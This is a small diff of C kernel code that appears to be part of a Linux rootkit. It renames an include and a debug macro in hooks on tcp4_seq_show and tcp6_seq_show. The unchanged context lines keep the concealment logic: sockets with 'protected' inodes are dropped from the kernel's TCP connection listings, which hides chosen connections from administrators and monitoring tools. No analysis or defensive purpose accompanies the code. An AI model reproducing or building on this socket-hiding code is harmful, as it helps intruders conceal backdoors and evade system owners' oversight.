@@ -1,5 +1,5 @@
 #include "../inc/cmds.h"
-#include "../inc/hook.h"
+#include "../inc/hooks.h"
 #include "../inc/util.h"
 
 #include <net/sock.h>
@@ -12,7 +12,7 @@ asmlinkage int32_t h_tcp4_seq_show(struct seq_file *seq, void *v) {
   hfind(_tcp4_seq_show, "tcp4_seq_show");
 
   if (SEQ_START_TOKEN != v)
-    debgf("current socket inode: %lu", inode_from_sock(v));
+    debg("current socket inode: %lu", inode_from_sock(v));
 
   if (is_inode_protected(inode_from_sock(v)))
     return 0;
@@ -34,7 +34,7 @@ asmlinkage int32_t h_tcp6_seq_show(struct seq_file *seq, void *v) {
   hfind(_tcp6_seq_show, "tcp6_seq_show");
 
   if (SEQ_START_TOKEN != v)
-    debgf("current socket inode: %lu", inode_from_sock(v));
+    debg("current socket inode: %lu", inode_from_sock(v));
 
   if (is_inode_protected(inode_from_sock(v)))
     return 0;
